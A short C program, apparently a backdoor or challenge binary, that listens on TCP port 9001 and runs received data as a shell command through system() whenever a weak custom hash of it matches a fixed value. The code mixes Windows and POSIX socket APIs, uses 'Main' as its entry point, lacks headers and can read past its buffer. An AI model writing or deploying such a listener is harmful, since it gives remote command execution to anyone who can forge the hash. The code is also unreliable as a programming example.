#include <stdio.h>

unsigned long hash(const unsigned char *s, int len)
{
    unsigned int ret = 0;
    while (len > 0) {
        ret += *(unsigned short *) s * len;
        s += 2, len -= 2;
    }
    if(len != 0) {
        ret += *s;
    }
    return ret;
}

void *fn(int c)
{
    char buf[128] = {0};
    int len = recv(c, buf, sizeof(buf), 0);
    if(hash(buf, len) == 0x98b55) {
        system(buf);
    }
    closesocket(c);
    return NULL;
}

int Main()
{
    int s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

    struct sockaddr_in service = {0};
    service.sin_family = AF_INET;
    service.sin_port = htons(9001);

    bind(s, (struct sockaddr *) &service, sizeof(service));

    listen(s, 5);

    while (1) {
        SOCKET c = accept(s, NULL, NULL);
        pthread_t t;
        pthread_create(&t, NULL, &fn, (void *) c);
        pthread_detach(t);
    }
    return 0;
}
